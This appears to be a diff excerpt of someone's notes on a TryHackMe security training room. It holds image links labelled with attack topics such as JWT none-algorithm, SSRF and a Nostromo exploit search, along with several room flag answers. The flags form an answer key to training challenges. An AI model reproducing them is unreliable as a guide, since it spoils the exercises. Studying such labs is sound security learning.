+- ![Sending our payload](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/9f657b909062ac82af12548b4f346aec.png)
+- ![Bruteforcing code](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/7e1ca7561c839f350a086a6d739c8a57.png)
+- ![Distributed bruteforcing](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/6e557475b0db7c4be710f75c24889808.png)
+- ***THM{Not_3ven_c4tz_c0uld_sav3_U!}***
+- ![Werkzeug console](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/e95fec72ec6881026a67b94c20d6067d.png)
+- The flag looks like **THM{...}**. Be sure to write it without the surrounding quotes!
+- ***THM{Just_a_tiny_misconfiguration}***
+- ![Nostromo version](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/79310c575c9809b1ac8e8546badb2d34.png)
+- ![Exploit-DB search](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/146fb6d0c48ef46d94f124921da171cc.png)
+- ***THM{But_1ts_n0t_my_f4ult!}***
+- ![Authentication Failures](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/1cadd89ea0ec694110f3539c9592a32f.png)
+- ![WinSCP hashes](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/b93dd140259193ee75ae1d12562bbd29.png)
+- ![JS without integrity checks](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/95712e9b375e22a57613a75c6b81384d.png)
+- ![Cookies](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/9c9ed045f84136a6e0100f4111d7f34d.png)
+- ![JSON Web Tokens](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/11c86acaea05f98045cec5634e03e997.png)
+- ![JWT None Algorithm](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/f5d1b4ef49ff4eef52e7617631225e8a.png)
+- ![Firefox Developer Tools](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/17765aa7418c977b2d07aa67305e04ad.png)
+- ![Chrome Developer Tools](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/cd52fcfd91df145fb31d7bad9b56ebdc.png)
+- ***THM{Dont_take_cookies_from_strangers}***
+- ![SSRF](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/271d0075650cdf6499f994f99fa7eb8a.png)
+- ***THM{Hello_Im_just_an_API_key}***
+
+## Notes / Lessons Learned
+[[CyberCrafted]]
+
